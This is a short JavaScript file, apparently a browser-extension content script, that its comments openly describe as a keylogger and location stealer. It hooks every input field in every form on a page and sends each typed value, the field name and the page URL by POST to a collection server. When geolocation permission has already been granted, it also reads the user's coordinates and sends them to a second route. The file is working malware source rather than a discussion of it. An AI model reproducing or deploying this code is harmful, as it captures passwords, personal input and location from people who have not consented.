for (var i = 0; i < document.forms.length; i++) { //Iterate by all the form elements in the DOM

	var curForm = document.forms[i]; //Take form i
	var inps = curForm.getElementsByTagName('input'); //Search for all inputs in the form
	for (var j = 0; j < inps.length; j++) { //Search inside all inputs

		var x = "";
        inps[j].addEventListener("input", function() { //put an event for text input
			var logindata = {}; //create a dictionary for returning to server
			logindata["url"] = document.URL; //with the url
			logindata["fieldname"] = this.name; //The name of the fild where written
			logindata["fieldvalue"] = this.value; //the values in the fild, the inputed text
            fetch('http://127.0.0.1:5000/k', //send it to an specific route for the Keylogger
            {
            method: "POST",
            mode: 'no-cors', 
            body: JSON.stringify(logindata),
            headers:{"Content-Type": "application/json"}
            })


		}, false);

	}
}


//The same would be found in the detective extension
//Steals the geolocation of the user
function captureGeolocation(){

    navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords; //Take the coordinates
        fetch('http://127.0.0.1:5000/g', //Send it to the specific route
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( {lat: latitude, lon : longitude}), //Send the data as a dictionary
        headers:{"Content-Type": "application/json"}
        }
)});}


navigator.permissions //look the pemrissions of the page
    .query({ name: "geolocation" }) //see if the geolocatin attribute
    .then(function (_a) {
    var state = _a.state;
    if (state === "granted") { //has been granted
        captureGeolocation(); //Then STEAL
    } 
}); 



